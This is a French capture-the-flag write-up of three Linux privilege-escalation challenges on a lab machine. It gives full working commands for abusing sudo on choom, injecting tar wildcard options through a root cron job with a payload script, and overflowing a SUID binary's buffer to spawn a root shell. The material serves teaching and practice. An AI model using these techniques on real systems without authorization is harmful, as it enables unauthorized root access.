0x01 Linux Privilege Escalation
Challenges d'escalade de privilèges sur Linux. L'objectif est d'obtenir un accès root en exploitant des faiblesses de configuration : permissions sudo mal restreintes, tâches cron vulnérables, et binaires SUID mal développés.

Méthodologie générale d'énumération
Avant d'exploiter quoi que ce soit, énumérer systématiquement :

# Droits sudo de l'utilisateur courant
sudo -l

# Binaires avec le bit SUID activé
find / -perm -4000 -type f 2>/dev/null

# Tâches cron système
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# Services actifs
systemctl list-units --type=service

# Fichiers modifiables dans des chemins sensibles
find /etc /usr /var -writable -type f 2>/dev/null
Tâche 0 — 0-flag.txt : sudo + GTFOBins (choom)
Étape 1 — Énumération des droits sudo
sudo -l
Résultat :

Matching Defaults entries for user:
    env_reset, mail_badpass, secure_path=...

User user may run the following commands:
    (ALL) NOPASSWD: /usr/bin/choom
L'utilisateur peut exécuter /usr/bin/choom en tant que root sans mot de passe.

Étape 2 — Comprendre choom
choom est un utilitaire du paquet util-linux qui ajuste l'OOM score d'un processus (Out-Of-Memory killer score). Quand la mémoire est épuisée, le kernel choisit quel processus tuer en fonction de ce score.

Sa syntaxe permet de lancer une commande avec un score ajusté :

choom -n <valeur> -- <commande>
Avec sudo, la commande après -- s'exécute en tant que root.

Étape 3 — Première tentative (échec)
sudo choom -n 0 -- cat /root/flag.txt
# → choom: failed to set score adjust value: Permission denied
Fixer le score à 0 requiert la capacité kernel CAP_SYS_RESOURCE, que le binaire n'a pas malgré sudo.

Étape 4 — Exploitation avec une valeur non nulle
sudo choom -n 1000 -- cat /root/flag.txt
# → CTF{privilege_escalation_via_sudo_choom_579eea17d42c385d4be6a0750c6b5562}
Une valeur non nulle (1000) ne requiert pas CAP_SYS_RESOURCE et permet à choom de lancer la commande.

Pourquoi c'est une vulnérabilité
choom est référencé sur GTFOBins comme binaire permettant l'exécution arbitraire de commandes. Tout binaire accordé en sudo sans restriction ((ALL) NOPASSWD) et listé sur GTFOBins peut être utilisé pour lire des fichiers root ou obtenir un shell.

Tâche 1 — 1-flag.txt : Tar Wildcard Injection via cron job
Étape 1 — Énumération des cron jobs
cat /etc/crontab
Résultat : cron jobs système standard, rien d'intéressant.

ls -la /etc/cron.d/
Résultat : un fichier inhabituel → my-cron-job

cat /etc/cron.d/my-cron-job
* * * * * root (cd /home/user/dropbox; /usr/bin/tar -czf /tmp/dropbox_backup.tar.gz *) 2>&1
Root exécute cette commande chaque minute. Le dossier /home/user/dropbox n'existe pas encore mais est créable par l'utilisateur.

Étape 2 — Identifier la vulnérabilité
Le * est développé par le shell avant d'être passé à tar. Il liste tous les fichiers du dossier comme arguments. Si un fichier s'appelle --checkpoint=1, tar l'interprète comme une option et non comme un fichier.

Deux options tar combinées permettent d'exécuter une commande arbitraire :

Option tar	Effet
--checkpoint=1	Déclenche une action à chaque fichier traité
--checkpoint-action=exec=<cmd>	Définit la commande à exécuter au checkpoint
Étape 3 — Créer le payload
mkdir -p /home/user/dropbox
cd /home/user/dropbox

# Script à exécuter en tant que root
echo 'cp /root/flag.txt /tmp/flag && chmod 777 /tmp/flag' > payload.sh
chmod +x payload.sh

# Fichiers dont le nom est interprété comme options tar lors du wildcard expansion
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh payload.sh"
Contenu du dossier :

--checkpoint=1
--checkpoint-action=exec=sh payload.sh
payload.sh
Étape 4 — Attendre le cron et lire le flag
cat /tmp/flag
# → cat: /tmp/flag: No such file or directory  (cron pas encore passé)

cat /tmp/flag
# → cat: /tmp/flag: No such file or directory

cat /tmp/flag
# → your flag is 
Tâche 2 — 2-flag.txt : Reverse engineering d'un binaire SUID + Buffer Overflow
Étape 1 — Énumération des binaires SUID
find / -perm -4000 -type f 2>/dev/null
Résultat :

/home/user/service     ← suspect : custom, dans le home, SUID root
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
...
Étape 2 — Analyse du binaire
ls -la /home/user/service
# → -rwsr-xr-x 1 root root 16944 Sep 18 2024 /home/user/service
#     ^^^  bit SUID activé, appartient à root

file /home/user/service
# → setuid ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
strings /home/user/service
Éléments notables extraits :

strcpy          ← copie sans vérification de taille
strcmp          ← compare deux chaînes
system          ← exécute une commande shell
setuid / setgid ← élève les privilèges
/bin/bash       ← cible de system()
22222222        ← chaîne hardcodée suspecte
11111111        ← autre chaîne suspecte
Usage: %s <input>
Buffer: %s
Étape 3 — Comportement du binaire
/home/user/service test
# → Buffer: test
#   e: 1 / s: 1 / t: 2   (compte les occurrences de chaque caractère)

/home/user/service 22222222
# → Buffer: 22222222
#   2: 8

/home/user/service 11111111
# → Buffer: 11111111
#   1: 8
Aucun shell obtenu avec ces valeurs seules.

Étape 4 — Vérification des protections
checksec --file=/home/user/service
Arch:    amd64-64-little
RELRO:   Partial RELRO
Stack:   No canary found      ← pas de protection stack
NX:      Stack Executable     ← stack exécutable
PIE:     No PIE (0x400000)    ← adresses binaire fixes
RWX:     Has RWX segments
cat /proc/sys/kernel/randomize_va_space
# → 2  (ASLR activé pour la stack, mais le binaire est à adresse fixe vu No PIE)
Étape 5 — Recherche du point de crash (offset BOF)
/home/user/service $(python3 -c "print('A'*100)")   # OK
/home/user/service $(python3 -c "print('A'*110)")   # OK
/home/user/service $(python3 -c "print('A'*115)")   # OK
/home/user/service $(python3 -c "print('A'*117)")   # OK
/home/user/service $(python3 -c "print('A'*119)")   # OK
/home/user/service $(python3 -c "print('A'*120)")   # Segmentation fault
/home/user/service $(python3 -c "print('A'*150)")   # Segmentation fault
/home/user/service $(python3 -c "print('A'*200)")   # Segmentation fault
Le segfault apparaît entre 119 et 120 caractères.

Étape 6 — Analyse du désassemblage
objdump -d /home/user/service | grep "^[0-9a-f]* <"
Fonctions identifiées :

0000000000401000 <_init>
00000000004010a0 <strcpy@plt>
00000000004010c0 <system@plt>
00000000004010e0 <strcmp@plt>
00000000004010f0 <setgid@plt>
0000000000401100 <setuid@plt>
00000000004011f6 <main>
objdump -d /home/user/service | grep -B 40 "callq  4010c0"
Structure de main identifiée dans le désassemblage :

; strcpy(rbp-0x70, argv[1])  ← copie argv[1] dans le buffer
; ... boucle de comptage de caractères ...
lea    -0x21(%rbp),%rax         ; rax = rbp-0x21 (zone à comparer)
lea    0xcef(%rip),%rsi         ; rsi = adresse de "22222222" dans .rodata
callq  strcmp                   ; compare rbp-0x21 avec "22222222"
test   %eax,%eax
jne    401377                   ; si différent → skip vers fin
; --- si égal ---
callq  setuid(0)
callq  setgid(0)
lea    ...,%rdi                 ; rdi = "/bin/bash"
callq  system                   ; system("/bin/bash") → shell root
objdump -s -j .rodata /home/user/service
402000: ....Usage: %s <input>
402010: nput>..Buffer: %s..%c
402020: : %d..22222222./bin/b   ← "22222222" à 0x40202b, "/bin/bash" juste après
402030: ash.
Étape 7 — Calcul de l'offset et exploitation
Le strcpy écrit depuis rbp-0x70. Le strcmp lit depuis rbp-0x21.

Distance entre les deux zones mémoire :

0x70 - 0x21 = 0x4F = 79 bytes
En envoyant 79 bytes de padding puis 22222222, on écrase exactement rbp-0x21 avec la valeur attendue par le strcmp :

/home/user/service $(python3 -c "print('A'*79 + '22222222')")
# → Buffer: AAAAAAAAAA...22222222
#   2: 8 / A: 79
# root@machine:~#    ← shell root obtenu !
cat /root/flag.txt
# → your flag is 
